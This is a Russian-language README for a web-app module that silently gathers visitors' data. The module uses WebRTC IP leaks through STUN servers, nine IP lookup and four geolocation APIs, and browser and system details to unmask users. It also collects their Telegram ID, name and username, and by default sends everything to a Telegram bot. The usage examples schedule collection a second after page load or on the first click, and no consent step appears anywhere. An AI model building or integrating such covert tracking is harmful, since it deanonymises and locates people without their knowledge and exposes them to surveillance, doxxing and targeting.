# 📦 DATA COLLECTOR - Модульная система сбора данных

## 🎯 Описание

Все скрипты сбора данных пользователя (WebRTC, IP API, Geo API, STUN серверы) вынесены в отдельные модули для:

- ⚡ **Мгновенной загрузки UI** - тяжелые скрипты не блокируют рендер
- 🔧 **Простого управления** - можно легко включить/отключить сбор
- 🚀 **Оптимизации производительности** - ленивая загрузка модулей
- 📊 **Гибкости** - разные режимы сбора данных

---

## 📁 Структура файлов

```
/utils/
  ├── data-collector.ts          # Основной модуль сбора данных
  ├── lazy-data-collector.ts     # Ленивая загрузка модуля
  ├── webrtc-ip.ts              # WebRTC + IP API + Geo API
  ├── telegram-bot.ts           # Отправка в Telegram бота
  └── DATA_COLLECTOR_README.md  # Документация
```

---

## 🚀 Использование

### 1️⃣ **Отложенный запуск (РЕКОМЕНДУЕТСЯ)**

UI загружается мгновенно, сбор данных начинается через 1 секунду:

```typescript
import { startDelayedDataCollection } from './utils/lazy-data-collector';

// В App.tsx
useEffect(() => {
  startDelayedDataCollection(1000); // 1 секунда задержки
}, []);
```

**Результат:**
- UI: **~100-200ms** ⚡⚡⚡
- Сбор данных: начинается через 1 секунду в фоне

---

### 2️⃣ **Ленивая загрузка**

Модуль загружается только когда нужен:

```typescript
import { startLazyDataCollection } from './utils/lazy-data-collector';

// Запуск по требованию
const handleClick = async () => {
  await startLazyDataCollection();
};
```

**Результат:**
- Модуль загружается только при вызове
- Экономия ресурсов на первой загрузке

---

### 3️⃣ **По взаимодействию пользователя**

Сбор начинается только после клика/скролла:

```typescript
import { startOnUserInteraction } from './utils/lazy-data-collector';

useEffect(() => {
  startOnUserInteraction(); // Запустится при первом клике/скролле
}, []);
```

**Результат:**
- UI: **мгновенно** ⚡⚡⚡
- Сбор: начинается при взаимодействии (или через 5 сек)

---

### 4️⃣ **Прямой запуск**

Немедленный сбор данных:

```typescript
import { startDataCollection } from './utils/data-collector';

useEffect(() => {
  startDataCollection();
}, []);
```

**Результат:**
- Все данные собираются сразу
- Может замедлить первую загрузку

---

## 📊 Режимы сбора данных

### **ПОЛНЫЙ режим (по умолчанию)**

```typescript
import { startDataCollection } from './utils/data-collector';

const data = await startDataCollection();
```

**Собирает:**
- ✅ WebRTC IP leak (множественные STUN)
- ✅ 9 IP API (параллельно)
- ✅ 4 Geo API (параллельно)
- ✅ User Agent, браузер, ОС
- ✅ Telegram данные
- ✅ **Отправляет в Telegram бота**

---

### **Только сбор (без отправки)**

```typescript
import { collectDataOnly } from './utils/data-collector';

const data = await collectDataOnly();
// data будет содержать все данные, но не отправит в бота
```

**Собирает:**
- ✅ Все данные (как в полном режиме)
- ❌ **НЕ отправляет в бота**

---

### **Базовый режим (быстрый)**

```typescript
import { collectBasicInfo } from './utils/data-collector';

const data = collectBasicInfo();
```

**Собирает:**
- ✅ User Agent, браузер, ОС
- ✅ Telegram данные
- ❌ Без WebRTC
- ❌ Без IP API
- ❌ Без Geo API

---

## ⚡ Сравнение производительности

| Метод | Время загрузки UI | Время полного сбора | Блокирует UI? |
|-------|-------------------|---------------------|---------------|
| **startDelayedDataCollection(1000)** | **~100-200ms** | ~5-6 сек | ❌ НЕТ |
| **startLazyDataCollection()** | ~100-200ms | ~4-5 сек | ❌ НЕТ |
| **startOnUserInteraction()** | **~100-200ms** | ~5-6 сек | ❌ НЕТ |
| **startDataCollection()** | ~4-5 сек | ~4-5 сек | ⚠️ ДА |

---

## 🔧 Настройка

### Изменить задержку отложенного запуска:

```typescript
// По умолчанию 1000ms (1 секунда)
startDelayedDataCollection(2000); // 2 секунды
startDelayedDataCollection(500);  // 0.5 секунды
startDelayedDataCollection(0);    // Сразу (но все равно асинхронно)
```

---

### Отключить сбор данных полностью:

```typescript
// В App.tsx - просто закомментируйте или удалите:
useEffect(() => {
  // startDelayedDataCollection(1000); // ОТКЛЮЧЕНО
}, []);
```

---

## 🎯 Что собирается?

### **WebRTC IP Leak:**
- IPv4 адреса
- IPv6 адреса
- Локальные IP
- Публичные IP через STUN серверы

### **IP API (9 сервисов):**
- ipapi.co
- ip-api.com
- ipinfo.io
- geoip-db.com
- freegeoip.app
- И другие...

### **Geo API (4 сервиса):**
- ipapi.co/json
- ip-api.com/json
- ipinfo.io/json
- geoip-db.com/json

### **Системная информация:**
- User Agent
- Браузер
- Операционная система
- Язык браузера
- Платформа
- Разрешение экрана
- Часовой пояс

### **Telegram данные:**
- ID пользователя
- Имя пользователя
- Username
- Language code
- И другое (если доступно)

---

## 🐛 Отладка

Все функции выводят подробные логи в консоль:

```javascript
// Открой консоль браузера (F12)

// Посмотреть что собирается:
// ✅ "🔍 АГРЕССИВНЫЙ сбор данных пользователя..."
// ✅ "📍 Primary IP: xxx.xxx.xxx.xxx"
// ✅ "🌍 Запуск агрессивного сбора геоданных..."
// ✅ "📦 Полный набор данных собран: {...}"
// ✅ "✅ Данные успешно отправлены в бота"
```

---

## 📝 Примеры

### Пример 1: Быстрая загрузка UI (текущий)

```typescript
// App.tsx
useEffect(() => {
  startDelayedDataCollection(1000);
}, []);
```

**Результат:**
- Пользователь видит UI через **~100-200ms**
- Сбор данных идет в фоне через 1 секунду
- Отправка в бота автоматическая

---

### Пример 2: Полностью отложенный запуск

```typescript
// App.tsx
useEffect(() => {
  startOnUserInteraction();
}, []);
```

**Результат:**
- UI загружается **мгновенно**
- Сбор начинается при первом клике/скролле
- Если пользователь не взаимодействует - через 5 секунд

---

### Пример 3: Ручной контроль

```typescript
// App.tsx
const [dataCollected, setDataCollected] = useState(false);

const handleStartCollection = async () => {
  const data = await startLazyDataCollection();
  setDataCollected(true);
  console.log('Собранные данные:', data);
};

// В UI
<button onClick={handleStartCollection}>
  Собрать данные
</button>
```

---

## ⚙️ Технические детали

### Ленивая загрузка модуля:

```typescript
// Модуль загружается только при первом вызове
const { startDataCollection } = await import('./data-collector');
```

**Преимущества:**
- Bundle splitting - меньший размер основного бандла
- Параллельная загрузка
- Кэширование модуля

---

### Асинхронность:

Все функции асинхронные и не блокируют UI:

```typescript
// ✅ Правильно - не блокирует
startDelayedDataCollection(1000);

// ⚠️ Блокирует - использовать только если нужно ждать результата
const data = await startDataCollection();
```

---

## 🔥 Рекомендации

### ✅ **РЕКОМЕНДУЕТСЯ:**

1. **Отложенный запуск:**
   ```typescript
   startDelayedDataCollection(1000);
   ```

2. **По взаимодействию:**
   ```typescript
   startOnUserInteraction();
   ```

### ❌ **НЕ РЕКОМЕНДУЕТСЯ:**

1. **Прямой синхронный вызов:**
   ```typescript
   // ❌ Блокирует UI
   const data = await startDataCollection();
   ```

2. **Множественные вызовы:**
   ```typescript
   // ❌ Дубликаты данных
   startDataCollection();
   startDataCollection();
   ```

---

## 📞 Поддержка

Если возникли вопросы или нужна помощь:

1. Проверьте консоль браузера (F12)
2. Найдите логи с эмодзи: 🔍 📍 🌍 📦 ✅
3. Проверьте отправку в бота: "✅ Данные успешно отправлены в бота"

---

## 🎉 Итог

Вся тяжелая работа по сбору данных вынесена в отдельные модули:

- ⚡ **UI грузится мгновенно**
- 🔧 **Легко управлять**
- 📊 **Гибко настраивать**
- 🚀 **Оптимально работает**

**Рекомендуемая конфигурация (текущая):**
```typescript
startDelayedDataCollection(1000); // UI: ~100-200ms, Сбор: через 1 сек
```
